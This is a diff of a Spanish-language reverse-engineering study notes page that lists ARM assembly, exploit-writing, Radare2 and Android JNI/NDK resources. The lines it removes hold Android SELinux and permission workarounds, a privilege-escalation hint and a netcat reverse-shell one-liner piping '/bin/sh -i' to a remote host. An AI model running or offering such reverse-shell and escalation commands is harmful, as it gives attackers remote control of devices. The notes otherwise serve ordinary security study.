@@ -28,7 +28,7 @@
  - [ld](https://sourceware.org/binutils/docs/ld/)  : 
 
 
-- [Intoducion al los comceptos basicos de  ensamblaje arm](https://azeria-labs.com/writing-arm-assembly-part-1/) 
+**[Intoducion al los comceptos basicos de  ensamblaje arm](https://azeria-labs.com/writing-arm-assembly-part-1/)**
 
 
 # ROP 
@@ -37,6 +37,7 @@
 # Desarollo de  exploit `ARM` 
 
  [1](https://fuzzysecurity.com/tutorials/expDev/1.html) 
+
  [2](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/) 
 
 # [Radare2](https://book.rada.re/config/evars.html)
@@ -56,89 +57,30 @@
 
 # Android Ingenieria Inversa 
 
+**Introducción a la interfaz nativa de Java (JNI)**
+
+La interfaz nativa de Java (JNI) permite a los desarrolladores declarar métodos Java implementados en código nativo (normalmente compilado en C/C++). La interfaz JNI no es específica de Android, pero está disponible de forma más general para aplicaciones Java que se ejecutan en diferentes plataformas.
+
 **Documentación de Oracle JNI**
-- Espesificacion de JNI
-- 
+
+- [Espesificacion de JNI](https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/jniTOC.html)
+- [Funciones de JNI](https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/functions.html) <<-- __Siempre tengo esta abierta y la consulto mientras invierto bibliotecas nativas de Android__
 
 
-# Analisis binario 
+**Referencias de JNI y NDK de Android**
 
-**Comceptos basico**
-
-- **Pila**
-
-- **Registro**
-
-- **Buffer** 
-    - [Como funciona la memoria](http://progra.usm.cl/apunte/c/memoria.html) 
+- [Consejos sobre JNI para Android](https://developer.android.com/training/articles/perf-jni) <-- Recomiendo leer la sección "Bibliotecas nativas" para comenzar
+- [Introducción al NDK](https://developer.android.com/ndk/guides/) <-- Esta es una guía sobre cómo los desarrolladores desarrollan bibliotecas nativas y comprenden cómo se construyen las cosas, lo que hace que sea más fácil revertirlas.
 
 
+# Contenido de la comunidad
 
+- [aqui](url) 
 
-A partir de android 11 `selinux` implementó varias restricciones, la buena noticia es que muchas de ellas se pueden 'bypassear' sin necesidad de ser root ni haciendo uso de adb xD. El mismo restringe las llamadas al sistema
+# Pendientes por resolver
 
+- [aqui](url)
 
-
-**Listar paquetes saltando protexion ** 
-
-```sh
-<<(pm list packages -3 --user 0 2>&1 < /dev/null )
-``` 
-```
-PATH=$PREFIX/bin && /system/bin/pm list packages --user 0
-```
-
-
-- Desde un usuario con uid2000 se  puede torgar permiso  
-```
-am start --user 0 -a android.settings.action.MANAGE_OVERLAY_PERMISSION -d "package:com.termux.x11"
-```
-
-# Investigar 
-
-- Si se logras ejecutar los binarios de ``/vendor/bin`` siendo usuario shell es posible escalar privilegios hasta el usuario ``system``. Mas informacion [aqui](https://t.me/Ivam3by_Cinderella/13/9867) 
-
-# Pendientes 
----
-*Aprender*
-[](https://rtx.meta.security/exploitation/2024/06/03/Android-Zygote-injection.html)
---- 
-
-**Rever shell**
-
-[Ejemplo](https://t.me/Ivam3by_Cinderella/13/9377)
-
---- 
-
-**Acseso remoto**
-
-```
-rlwrap /system/bin/toybox nc serveo.net 65000
-```
-
-```
-tali -n0 -f $TMPDIR/xD|/bin/sh -i 2>&1| nc <IP> <port> 1>$TMPDIR/xD  
-```
-
----
-
-**Hacer funcional `qemu-i386`  
-
-
-```sh 
-⊨ qemu-i386 ~/ch1.bin                                    ~/p/v/_posts
-qemu-i386: Could not open '/lib/ld-linux.so.2': No such file or directory
-```
-
-**Referencia**
-
-https://tldp.org/HOWTO/Glibc2-HOWTO-5.html
-
----
-
-
-**Telegram**
-https://t.me/Ivam3by_Cinderella/19953
 
 # Foros que me llamaron la atencion 
 [bypassing-root-detection](https://medium.com/@aimardcr/bypassing-root-detection-the-universal-way-2625712172e5) 
